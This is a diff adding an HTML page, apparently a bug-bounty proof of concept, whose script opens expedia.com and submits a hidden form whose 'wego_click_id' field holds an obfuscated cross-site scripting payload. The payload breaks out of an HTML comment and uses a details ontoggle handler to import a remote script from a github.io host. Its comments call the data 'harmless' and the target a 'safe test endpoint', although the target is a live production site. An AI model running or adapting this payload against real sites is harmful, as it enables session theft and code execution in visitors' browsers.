@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title></title>
+</head>
+
+<body>
+  TESTING
+    <script>
+    // Step 1: Open the target page (replace with your local test URL)
+    const testUrl = "https://www.expedia.com/web/home.aspx";
+    const newWin = window.open(testUrl, "_blank");
+
+    // Step 2: Wait until the new window is loaded
+    newWin.onload = () => {
+        console.log("New window loaded:", newWin.location.href);
+
+        // Step 3: Build a form to simulate POST (safe test endpoint)
+        const form = newWin.document.createElement("form");
+        form.method = "POST";
+        form.action = "https://www.expedia.com/web/home.aspx";
+        form.enctype = "multipart/form-data";
+
+        // Add some harmless form data
+        const input = newWin.document.createElement("input");
+        input.type = "hidden";
+        input.name = "wego_click_id";
+        input.value = '--><details open="&quot;x&quot;"ontogglE=/*x\42\70*/import(`//bug-vs-me.github.io/xss.js`)><!--';
+        form.appendChild(input);
+
+        newWin.document.body.appendChild(form);
+        form.submit();
+
+        // Step 4: Reload the original window again to simulate workflow
+        window.location.href = testUrl;
+    };
+    </script>
+</body>
+
+</html>
